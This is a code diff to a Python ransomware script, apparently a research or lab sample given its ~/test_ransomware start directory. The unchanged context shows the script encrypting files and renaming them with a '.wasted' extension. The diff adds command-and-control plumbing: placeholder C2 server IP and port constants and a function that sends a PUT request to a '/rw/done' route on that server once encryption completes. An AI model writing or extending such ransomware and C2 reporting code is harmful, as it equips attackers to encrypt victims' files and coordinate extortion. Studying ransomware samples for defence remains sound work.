@@ -1,6 +1,7 @@
 from argparse import ArgumentParser
 from base64 import b64encode, b64decode
 from os import environ, path, rename, walk
+from requests import put
 from sys import argv
 from time import time, sleep
 
@@ -14,6 +15,10 @@ from globals import get_config_from_file
 # ============================================================
 # ============ 		GLOBALS 	  ==============
 # ============================================================
+
+C2_IP = "<C2-Server-IP"
+C2_PORT = "<C2-Port>"
+C2_RW_ROUTE = "/rw/done"
 
 LINUX_STARTDIRS = [environ['HOME'] + '/test_ransomware']
 EXTENSION = ".wasted"  # Ransomware custom extension
@@ -307,6 +312,10 @@ def decrypt_files(key, start_dirs):
                 # print("File changed from " + file + " to " + file_original)
 
 
+def notify_rw_done():
+    put(url="{}:{}{}".format(C2_IP, C2_PORT, C2_RW_ROUTE), data="")
+
+
 def run(encrypt, absolute_paths=None):
     if absolute_paths is not None and type(absolute_paths) == str:
         start_dirs = absolute_paths.split(",")
@@ -337,6 +346,7 @@ def run(encrypt, absolute_paths=None):
 
     if encrypt:
         encrypt_files(key, start_dirs)
+        notify_rw_done()
     else:
         decrypt_files(key, start_dirs)
 
